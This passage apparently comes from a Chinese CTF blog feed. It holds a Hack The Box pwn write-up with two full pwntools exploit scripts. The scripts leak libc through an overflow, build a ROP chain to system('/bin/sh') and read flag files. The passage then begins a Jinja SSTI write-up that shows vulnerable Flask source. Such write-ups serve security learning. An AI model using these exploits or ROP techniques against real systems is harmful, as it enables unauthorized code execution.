class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/14 09:59:41</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#from libcfind import *</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./loginsim'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#context.arch=e.arch</span></span><br><span class="line">ip_port=[<span class="string">'167.99.205.117'</span>,<span class="number">30301</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(mun,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username length:'</span>)</span><br><span class="line">    p.sendline(str(mun))</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Enter username:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess_libc</span><span class="params">(n)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">elf_link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>+<span class="number">8</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0xe6c7e execve("/bin/sh", r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve("/bin/sh", r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve("/bin/sh", rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#while True:</span></span><br><span class="line"><span class="comment">#    try :</span></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">            p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">            p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        stdout_addr=link()</span><br><span class="line">        <span class="comment">#x=finder('_IO_2_1_stdout_',stdout_addr,num=1)</span></span><br><span class="line">        elf_base=elf_link()<span class="number">-0x25fe</span></span><br><span class="line">        libc_base=stdout_addr<span class="number">-0x1ec6a0</span></span><br><span class="line">        system_addr=<span class="number">0x000000000055410</span>+libc_base</span><br><span class="line">        gets_addr= <span class="number">0x86af0</span>+libc_base</span><br><span class="line">        puts_addr=<span class="number">0x0000000000875a0</span>+libc_base</span><br><span class="line">        rsi_ret=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">        rdi_ret=<span class="number">0x0000000000026b72</span>+libc_base</span><br><span class="line">        </span><br><span class="line">        bin_sh_addr=elf_base+<span class="number">0x4000</span>+<span class="number">0x100</span></span><br><span class="line">        ret=<span class="number">0x0000000000025679</span>+libc_base</span><br><span class="line">        log.info(<span class="string">'bin_sh_addr:'</span>+hex(bin_sh_addr))</span><br><span class="line">        log.info(<span class="string">'libc_base'</span>+hex(libc_base))</span><br><span class="line">        log.info(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line">        <span class="comment">#debug()</span></span><br><span class="line">        p.recv(timeout=<span class="number">4</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.sendline(str(<span class="number">0x80</span>))<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">'w'</span>*(<span class="number">0x40</span>)+chr(<span class="number">0x20</span>)*<span class="number">0x78</span>+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(puts_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(system_addr))</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="remote-problem"><a href="#remote-problem" class="headerlink" title="remote_problem"></a>remote_problem</h2><p>看上面最初exp时间，可以看到我很久就在本地解决出来但是什么最近才打通远程呢？</p><p>根本原因是netwrok，与htb靶机交换时间太长。这是一个非常影响体验感的问题。在远程中出错也无法即时排查。(ps:应该给个dockerfile)</p><p>其次，我leak数据过多了，不仅要leak libc地址，还有leak elf的地址。我在想只需要libc地址。同时，由于不了解自身本地环境与远程机的寄存器和栈环境，是否完全相同也无法轻易使用 one_gadget 。但查阅资料发现libc中自身存在一个<code>/bin/sh</code>后门字符串。我们可以通过libc-database来查询得到这个地址，当然也可以用ROPgadget来找到这个地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary .&#x2F;glibc&#x2F;libc.so.6  --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00000000001b75aa : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>于是我用我写的工具libcfind(<a href="https://github.com/lexsd6/LibcSearcher_plus" target="_blank" rel="noopener">LibcSearcher_plus</a>)来自动查询libc-database，验证本地与远程libc环境是否相同。</p><p>同时，我们用libc中自身存在一个<code>/bin/sh</code>后门字符串，就不需要leak 程序的基地址只需要libc的基础地址。</p><p>由于就算开了PIE与NX，一个libc函数在x64在一位一定是<code>\x7f</code>,末位一定是固定的。这样我们就可以少leak俩个位。加上不leak 程序的基地址。我们现在只需要leak 4位数大幅减少leak时间。让我们有更多机会试one_gadget 和system地址对齐的错。</p><h2 id="remote-exp"><a href="#remote-exp" class="headerlink" title="remote_exp"></a>remote_exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./loginsim'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#context.arch=e.arch</span></span><br><span class="line">ip_port=[<span class="string">'167.99.205.117'</span>,<span class="number">30301</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(mun,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username length:'</span>)</span><br><span class="line">    p.sendline(str(mun))</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Enter username:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7f</span>  </span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xa0</span></span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0xe6c7e execve("/bin/sh", r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve("/bin/sh", r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve("/bin/sh", rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        <span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">            p=process(elf)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line">        stdout_addr=link()</span><br><span class="line">        x=finder(<span class="string">'_IO_2_1_stdout_'</span>,stdout_addr,num=<span class="number">1</span>)</span><br><span class="line">        libc_base=stdout_addr<span class="number">-0x1ec6a0</span></span><br><span class="line">        system_addr=<span class="number">0x000000000055410</span>+libc_base</span><br><span class="line">        puts_addr=<span class="number">0x0000000000875a0</span>+libc_base</span><br><span class="line">        <span class="comment">#0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line">        rdi_ret=<span class="number">0x000000000011c371</span>+libc_base</span><br><span class="line">        sh_addr=<span class="number">0x00000000001b5661</span>+libc_base</span><br><span class="line">        ret=<span class="number">0x0000000000025679</span>+libc_base</span><br><span class="line">        log.info(<span class="string">'sh:'</span>+hex(sh_addr))</span><br><span class="line">        log.info(hex(sh_addr))</span><br><span class="line">        log.info(hex(libc_base))</span><br><span class="line">        debug()</span><br><span class="line">        p.recv(timeout=<span class="number">4</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.sendline(str(<span class="number">0x80</span>))<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        rsi_ret=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">        <span class="comment">#0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line">        rdi_ret=<span class="number">0x0000000000026b72</span>+libc_base</span><br><span class="line">        p.sendline(<span class="string">'w'</span>*(<span class="number">0x40</span>)+chr(<span class="number">0x20</span>)*<span class="number">0x78</span>+p64((rdi_ret))+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(x.dump(<span class="string">'system'</span>))+<span class="string">'x'</span>*<span class="number">0x10</span>+</span><br><span class="line">chr(<span class="number">0x0</span>)*<span class="number">8</span>+<span class="string">'\x00'</span>*<span class="number">0x100</span>)<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        print(p.recv(timeout=<span class="number">4</span>))        </span><br><span class="line">        p.sendline(<span class="string">'ls'</span>)</span><br><span class="line">        print(p.recvline(timeout=<span class="number">2</span>)) </span><br><span class="line">        <span class="comment">#p.interactive()</span></span><br><span class="line">        p.sendline(<span class="string">'cat /home/pwn_login_simulator/f*'</span>)</span><br><span class="line">        p.sendline(<span class="string">'cat /f*'</span>)</span><br><span class="line">        p.sendline(<span class="string">'cat fla*'</span>)</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-baby_ninja_jinja-web-challenge-wp</title>
      <link href="/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/"/>
      <url>/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/</url>
      
        <content type="html"><![CDATA[<p>单纯的python ssti 已经是过去了,但是偶尔刷下还是有意思…<a id="more"></a></p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>进入页面，发现有一个输入接口：</p><p><img src="image-20220326224004255.png" alt="image-20220326224004255"></p><p>按下F12查看源码：发现提示有<code>/debug</code> 路由。找到了源码提示:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, render_template, request, Response, render_template_string, g</span><br><span class="line"><span class="keyword">import</span> functools, sqlite3, os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line">acc_tmpl = <span class="string">'''&#123;% extends 'index.html' %&#125;</span></span><br><span class="line"><span class="string">&#123;% block content %&#125;</span></span><br><span class="line"><span class="string">&lt;h3&gt;baby_ninja joined, total number of rebels: reb_num&lt;br&gt;</span></span><br><span class="line"><span class="string">&#123;% endblock %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db</span><span class="params">()</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(<span class="string">'/tmp/ninjas.db'</span>)</span><br><span class="line">        db.isolation_level = <span class="literal">None</span></span><br><span class="line">        db.row_factory = sqlite3.Row</span><br><span class="line">        db.text_factory = (<span class="keyword">lambda</span> s: s.replace(<span class="string">'&#123;&#123;'</span>, <span class="string">''</span>).</span><br><span class="line">            replace(<span class="string">"'"</span>, <span class="string">'&amp;#x27;'</span>).</span><br><span class="line">            replace(<span class="string">'"'</span>, <span class="string">'&amp;quot;'</span>).</span><br><span class="line">            replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).</span><br><span class="line">            replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_db</span><span class="params">(query, args=<span class="params">()</span>, one=False)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        cur = get_db().execute(query, args)</span><br><span class="line">        rv = [dict((cur.description[idx][<span class="number">0</span>], str(value)) \</span><br><span class="line">            <span class="keyword">for</span> idx, value <span class="keyword">in</span> enumerate(row)) <span class="keyword">for</span> row <span class="keyword">in</span> cur.fetchall()]</span><br><span class="line">        <span class="keyword">return</span> (rv[<span class="number">0</span>] <span class="keyword">if</span> rv <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">if</span> one <span class="keyword">else</span> rv</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.open_resource(<span class="string">'schema.sql'</span>, mode=<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        get_db().cursor().executescript(f.read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_connection</span><span class="params">(exception)</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span 